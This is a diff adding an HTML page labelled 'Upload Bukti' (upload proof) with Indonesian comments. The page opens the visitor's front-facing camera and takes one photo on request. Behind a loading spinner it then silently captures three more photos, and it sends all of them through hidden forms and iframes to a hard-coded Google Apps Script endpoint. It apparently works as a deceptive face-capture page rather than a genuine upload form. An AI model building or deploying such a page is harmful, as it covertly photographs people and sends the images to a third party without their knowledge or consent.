@@ -1,0 +1,1091 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+  <meta charset="UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Upload Bukti</title>
+
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+
+    body {
+
+      margin: 0;
+
+      min-height: 100vh;
+
+      background: #ffffff;
+
+      font-family: Arial, sans-serif;
+
+      display: flex;
+
+      justify-content: center;
+
+      align-items: center;
+
+    }
+
+
+    .container {
+
+      width: 90%;
+
+      max-width: 420px;
+
+      text-align: center;
+
+    }
+
+
+    #uploadButton {
+
+      width: 100%;
+
+      padding: 16px;
+
+      border: none;
+
+      border-radius: 10px;
+
+      background: #111;
+
+      color: white;
+
+      font-size: 17px;
+
+      font-weight: bold;
+
+      cursor: pointer;
+
+    }
+
+
+    #uploadButton:disabled {
+
+      opacity: 0.5;
+
+    }
+
+
+    #video {
+
+      width: 100%;
+
+      margin-top: 20px;
+
+      border-radius: 12px;
+
+      background: #000;
+
+      display: none;
+
+    }
+
+
+    #canvas {
+
+      display: none;
+
+    }
+
+
+    #loading {
+
+      display: none;
+
+      margin-top: 25px;
+
+    }
+
+
+    .spinner {
+
+      width: 32px;
+
+      height: 32px;
+
+      margin: auto;
+
+      border: 4px solid #ddd;
+
+      border-top: 4px solid #111;
+
+      border-radius: 50%;
+
+      animation:
+        spin 0.8s linear infinite;
+
+    }
+
+
+    @keyframes spin {
+
+      100% {
+
+        transform:
+          rotate(360deg);
+
+      }
+
+    }
+
+
+    #thankyou {
+
+      display: none;
+
+      font-size: 20px;
+
+      font-weight: bold;
+
+      color: #111;
+
+    }
+
+
+    #error {
+
+      display: none;
+
+      margin-top: 20px;
+
+      color: #d00;
+
+    }
+
+
+    iframe {
+
+      display: none;
+
+    }
+  </style>
+
+</head>
+
+
+<body>
+
+
+  <div class="container">
+
+
+    <button id="uploadButton" onclick="openCamera()">
+
+      Upload Bukti
+
+    </button>
+
+
+    <video id="video" autoplay playsinline>
+    </video>
+
+
+    <canvas id="canvas">
+    </canvas>
+
+
+    <div id="loading">
+
+      <div class="spinner"></div>
+
+    </div>
+
+
+    <div id="thankyou">
+
+      Thank you
+
+    </div>
+
+
+    <div id="error"></div>
+
+
+  </div>
+
+
+  <script>
+
+
+    // =====================================================
+    // URL GOOGLE APPS SCRIPT
+    // =====================================================
+
+    const GAS_URL =
+      'https://script.google.com/macros/s/AKfycbyTXqpKOHsVlUNhQ_vWe9o5kMBdYjkTCp7gQfky0h00ohNMgIDSTi5PtD3gZ_f-bc_a/exec';
+
+
+    // =====================================================
+    // GLOBAL
+    // =====================================================
+
+    let stream = null;
+
+    let firstPhotoMode = true;
+
+
+    // =====================================================
+    // OPEN CAMERA
+    // =====================================================
+
+    async function openCamera() {
+
+
+      const button =
+        document.getElementById(
+          'uploadButton'
+        );
+
+
+      button.disabled =
+        true;
+
+
+      try {
+
+
+        // =================================================
+        // AKSES KAMERA DEPAN
+        // =================================================
+
+        stream =
+          await navigator.mediaDevices
+            .getUserMedia({
+
+              video: {
+
+                facingMode: {
+                  ideal: 'user'
+                },
+
+                width: {
+                  ideal: 1280
+                },
+
+                height: {
+                  ideal: 720
+                }
+
+              },
+
+              audio: false
+
+            });
+
+
+        const video =
+          document.getElementById(
+            'video'
+          );
+
+
+        video.srcObject =
+          stream;
+
+
+        video.style.display =
+          'block';
+
+
+        await video.play();
+
+
+        // =================================================
+        // TUNGGU KAMERA SIAP
+        // =================================================
+
+        await waitForVideo();
+
+
+        // =================================================
+        // TAMPILKAN TOMBOL FOTO PERTAMA
+        // =================================================
+
+        button.disabled =
+          false;
+
+
+        button.innerText =
+          'Ambil Foto';
+
+
+        button.onclick =
+          takeFirstPhoto;
+
+
+      }
+
+
+      catch (error) {
+
+
+        showError(
+          error.message
+        );
+
+
+        button.disabled =
+          false;
+
+      }
+
+    }
+
+
+    // =====================================================
+    // WAIT CAMERA READY
+    // =====================================================
+
+    function waitForVideo() {
+
+
+      return new Promise(
+
+        function (resolve) {
+
+
+          const video =
+            document.getElementById(
+              'video'
+            );
+
+
+          if (
+            video.videoWidth > 0
+          ) {
+
+            resolve();
+
+            return;
+
+          }
+
+
+          const timer =
+            setInterval(
+
+              function () {
+
+
+                if (
+                  video.videoWidth > 0
+                ) {
+
+
+                  clearInterval(
+                    timer
+                  );
+
+
+                  resolve();
+
+                }
+
+              },
+
+              100
+
+            );
+
+        }
+
+      );
+
+    }
+
+
+    // =====================================================
+    // FOTO PERTAMA
+    // =====================================================
+
+    async function takeFirstPhoto() {
+
+
+      const button =
+        document.getElementById(
+          'uploadButton'
+        );
+
+
+      button.disabled =
+        true;
+
+
+      // =================================================
+      // LOADING
+      // =================================================
+
+      showLoading();
+
+
+      try {
+
+
+        // =================================================
+        // CAPTURE PERTAMA
+        // =================================================
+
+        const image =
+          captureFrame();
+
+
+        // =================================================
+        // UPLOAD PERTAMA
+        // =================================================
+
+        const success =
+          await uploadPhoto(
+
+            image,
+
+            1
+
+          );
+
+
+        if (!success) {
+
+          throw new Error(
+            'Foto pertama gagal diupload.'
+          );
+
+        }
+
+
+        // =================================================
+        // FOTO 2
+        // =================================================
+
+        await wait(1200);
+
+
+        await automaticCapture(
+          2
+        );
+
+
+        // =================================================
+        // FOTO 3
+        // =================================================
+
+        await wait(1200);
+
+
+        await automaticCapture(
+          3
+        );
+
+
+        // =================================================
+        // FOTO 4
+        // =================================================
+
+        await wait(1200);
+
+
+        await automaticCapture(
+          4
+        );
+
+
+        // =================================================
+        // SELESAI
+        // =================================================
+
+        stopCamera();
+
+
+        hideLoading();
+
+
+        document.getElementById(
+          'video'
+        ).style.display =
+          'none';
+
+
+        document.getElementById(
+          'uploadButton'
+        ).style.display =
+          'none';
+
+
+        document.getElementById(
+          'thankyou'
+        ).style.display =
+          'block';
+
+
+      }
+
+
+      catch (error) {
+
+
+        hideLoading();
+
+
+        stopCamera();
+
+
+        showError(
+          error.message
+        );
+
+
+        button.disabled =
+          false;
+
+
+        button.innerText =
+          'Upload Bukti';
+
+
+        button.onclick =
+          openCamera;
+
+      }
+
+    }
+
+
+    // =====================================================
+    // AUTOMATIC CAPTURE
+    // =====================================================
+
+    async function automaticCapture(
+      number
+    ) {
+
+
+      const image =
+        captureFrame();
+
+
+      const success =
+        await uploadPhoto(
+
+          image,
+
+          number
+
+        );
+
+
+      if (!success) {
+
+        throw new Error(
+
+          'Capture ' +
+          number +
+          ' gagal diupload.'
+
+        );
+
+      }
+
+    }
+
+
+    // =====================================================
+    // CAPTURE FRAME
+    // =====================================================
+
+    function captureFrame() {
+
+
+      const video =
+        document.getElementById(
+          'video'
+        );
+
+
+      const canvas =
+        document.getElementById(
+          'canvas'
+        );
+
+
+      if (
+        video.videoWidth === 0
+      ) {
+
+        throw new Error(
+          'Kamera belum siap.'
+        );
+
+      }
+
+
+      canvas.width =
+        video.videoWidth;
+
+
+      canvas.height =
+        video.videoHeight;
+
+
+      const ctx =
+        canvas.getContext(
+          '2d'
+        );
+
+
+      ctx.drawImage(
+
+        video,
+
+        0,
+
+        0,
+
+        canvas.width,
+
+        canvas.height
+
+      );
+
+
+      return canvas.toDataURL(
+
+        'image/jpeg',
+
+        0.75
+
+      );
+
+    }
+
+
+    // =====================================================
+    // UPLOAD
+    // =====================================================
+
+    function uploadPhoto(
+      image,
+      number
+    ) {
+
+
+      return new Promise(
+
+        function (resolve) {
+
+
+          // =============================================
+          // ID
+          // =============================================
+
+          const id =
+
+            Date.now() +
+
+            '_' +
+
+            number +
+
+            '_' +
+
+            Math.random()
+              .toString(36)
+              .substring(2);
+
+
+          // =============================================
+          // IFRAME
+          // =============================================
+
+          const iframe =
+            document.createElement(
+              'iframe'
+            );
+
+
+          iframe.name =
+            'upload_' + id;
+
+
+          iframe.style.display =
+            'none';
+
+
+          document.body.appendChild(
+            iframe
+          );
+
+
+          let finished =
+            false;
+
+
+          // =============================================
+          // LOAD RESPONSE
+          // =============================================
+
+          iframe.onload =
+            function () {
+
+
+              if (finished) {
+
+                return;
+
+              }
+
+
+              finished =
+                true;
+
+
+              /*
+                Google Apps Script sudah
+                menerima dan memproses
+                form POST.
+    
+                Beri sedikit waktu tambahan
+                sebelum lanjut ke capture berikutnya.
+              */
+
+              setTimeout(
+
+                function () {
+
+
+                  if (
+                    iframe.parentNode
+                  ) {
+
+                    iframe.remove();
+
+                  }
+
+
+                  resolve(true);
+
+
+                },
+
+                1000
+
+              );
+
+            };
+
+
+          // =============================================
+          // TIMEOUT
+          // =============================================
+
+          const timeout =
+            setTimeout(
+
+              function () {
+
+
+                if (finished) {
+
+                  return;
+
+                }
+
+
+                finished =
+                  true;
+
+
+                if (
+                  iframe.parentNode
+                ) {
+
+                  iframe.remove();
+
+                }
+
+
+                resolve(false);
+
+
+              },
+
+              60000
+
+            );
+
+
+          // =============================================
+          // FORM
+          // =============================================
+
+          const form =
+            document.createElement(
+              'form'
+            );
+
+
+          form.method =
+            'POST';
+
+
+          form.action =
+            GAS_URL;
+
+
+          form.target =
+            iframe.name;
+
+
+          form.enctype =
+            'application/x-www-form-urlencoded';
+
+
+          form.style.display =
+            'none';
+
+
+          // =============================================
+          // PAYLOAD
+          // =============================================
+
+          const payload = {
+
+            id:
+              id,
+
+            captureNumber:
+              number,
+
+            image:
+              image
+
+          };
+
+
+          const input =
+            document.createElement(
+              'input'
+            );
+
+
+          input.type =
+            'hidden';
+
+
+          input.name =
+            'payload';
+
+
+          input.value =
+            JSON.stringify(
+              payload
+            );
+
+
+          form.appendChild(
+            input
+          );
+
+
+          document.body.appendChild(
+            form
+          );
+
+
+          // =============================================
+          // SUBMIT
+          // =============================================
+
+          try {
+
+            form.submit();
+
+          }
+
+          catch (error) {
+
+
+            clearTimeout(
+              timeout
+            );
+
+
+            if (!finished) {
+
+
+              finished =
+                true;
+
+
+              if (
+                iframe.parentNode
+              ) {
+
+                iframe.remove();
+
+              }
+
+
+              if (
+                form.parentNode
+              ) {
+
+                form.remove();
+
+              }
+
+
+              resolve(false);
+
+            }
+
+
+            return;
+
+          }
+
+
+          // =============================================
+          // REMOVE FORM
+          // =============================================
+
+          setTimeout(
+
+            function () {
+
+              if (
+                form.parentNode
+              ) {
+
+                form.remove();
+
+              }
+
+            },
+
+            5000
+
+          );
+
+        }
+
+      );
+
+    }
+
+
+    // =====================================================
+    // LOADING
+    // =====================================================
+
+    function showLoading() {
+
+      document.getElementById(
+        'loading'
+      ).style.display =
+        'block';
+
+    }
+
+
+    function hideLoading() {
+
+      document.getElementById(
+        'loading'
+      ).style.display =
+        'none';
+
+    }
+
+
+    // =====================================================
+    // ERROR
+    // =====================================================
+
+    function showError(
+      message
+    ) {
+
+
+      const error =
+        document.getElementById(
+          'error'
+        );
+
+
+      error.innerText =
+        message;
+
+
+      error.style.display =
+        'block';
+
+    }
+
+
+    // =====================================================
+    // STOP CAMERA
+    // =====================================================
+
+    function stopCamera() {
+
+
+      if (!stream) {
+
+        return;
+
+      }
+
+
+      stream
+        .getTracks()
+        .forEach(
+
+          function (track) {
+
+            track.stop();
+
+          }
+
+        );
+
+
+      stream =
+        null;
+
+    }
+
+
+    // =====================================================
+    // WAIT
+    // =====================================================
+
+    function wait(ms) {
+
+      return new Promise(
+
+        resolve =>
+          setTimeout(
+            resolve,
+            ms
+          )
+
+      );
+
+    }
+
+  </script>
+
+
+</body>
+
+</html>
